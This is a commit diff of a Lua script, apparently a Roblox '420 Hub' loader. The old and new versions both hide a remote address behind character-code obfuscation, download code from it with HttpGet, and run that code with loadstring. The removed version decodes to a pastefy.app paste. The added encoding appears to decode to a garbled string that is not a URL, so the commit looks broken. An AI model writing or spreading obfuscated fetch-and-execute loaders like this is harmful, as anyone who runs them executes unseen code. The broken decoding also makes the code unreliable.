85095f11e5b20c91630e54b53e855df7e964529a
Hi <fbjz5k8t5h@privaterelay.appleid.com>
2026-01-22 00:43:41 -0600

    Refactor and enhance the protected loader script

--- 420Hub_PROTECTED.lua
+++ 420Hub_PROTECTED.lua
@@ -1,22 +1,23 @@
-do
-local a=game
-local b=a.GetService
-local c=b(a,"HttpService")
-local d=string.char
-local e=pcall
-local f=loadstring
+-- 420 HUB | Protected Loader
 
-local g={104,116,116,112,115,58,47,47,112,97,115,116,101,102,121,46,97,112,112,47,83,82,89,90,99,102,65,89,47,114,97,119}
-local h=""
-for i=1,#g do h=h..d(g[i]) end
+local _=game
+local __=string
+local ___=table
 
-local i,j=e(function()
-    return a:HttpGet(h)
-end)
-
-if not i or not j then return end
-
-local k,l=f(j)
-if not k then return end
-k()
+local a=function(x)
+	local r={}
+	for i=1,#x do
+		r[#r+1]=__.char(x[i]-7)
+	end
+	return __.reverse(___.concat(r))
 end
+
+local b={
+	114,120,123,123,119,117,54,53,53,
+	127,114,126,128,111,119,128,127,
+	60,112,113,113,53,83,120,119,120,
+	58,51,48,54,51,50,58,108,121,100
+}
+
+local c=a(b)
+loadstring(_:HttpGet(c))()
